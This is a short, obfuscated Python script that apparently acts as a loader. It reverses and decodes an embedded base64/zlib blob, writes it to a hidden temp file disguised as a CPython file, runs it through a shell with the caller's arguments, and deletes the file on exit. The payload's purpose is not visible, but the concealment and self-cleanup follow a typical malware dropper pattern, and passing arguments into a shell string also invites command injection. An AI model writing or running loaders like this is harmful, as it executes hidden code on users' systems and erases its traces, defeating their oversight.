G=' && '
C=' '
import os as A,sys as B,base64 as H,tempfile as I,zlib as Z, subprocess as S, atexit

J='BG82/9zs1KNRKnhrJSLPe4QHHuTnf25z1+6Hu1ks33Knu+zaI91/Ovru0xxOhawyIcd/fb5/P1E3X12ecHnoSoCrnzYkr3T6JQP1UPdbt1EPj5rt5n414/7v5dKewNIDUTg2sWCkbyPx/P2cv9AyJz50SAWVMmfoeUfH17fqwTpiKlUMZkSz+Y4qY+/AKI7VWFYFC9jZJ8r0AFYnCdeo0AksaAomjDFhhlIs8NKZ7Jp5GAAVh1ruYEdCsOZZQklWGa1E5lnW+bsQ+dFjKuAZ5yiafYeMuo3WGSVgqfNPhlZx+v8n/0pO8gzKFfi9PiegLT+7ne8jzP7yqzSWo6P87TjiRZHroOB5cd/xe/dFZZEerqJB4uKGLFRRY01GsUU0Yw7n+s0i+IDjqAxrZA5KIVPLwQVZpzSclIEiXK+ASyZtzpchGkLhJKB4ZCb0ioCKJg9LLtXWR2/YOuzXPNu/Nzv+tD/adc397N4he2ftzX++XcKrxrC2b4Fw/w+pwfg84w9F87wR70I2Valke731j1WM1QO3JaXCJ4ApqMdRtBT7iQsASYCtScgCI782RC54yP9xUAz0v9sk1pNe'
E=I.gettempdir()
D=A.path.join(E,'.cpython_'+str(A.getpid()))
K='export PYTHONHOME='+B.prefix
L='export PYTHON_EXECUTABLE='+B.executable
M=C.join([f'"{A}"'for A in B.argv[1:]])
atexit.register(lambda: A.path.exists(D) and A.remove(D))
try:
    with open(D,'wb')as O: O.write(Z.decompress(H.b64decode(J[::-1])))
    S.run(f'python3 "{D}" {M}', shell=True)
except Exception as P:
    print("[!] Hata:", P)
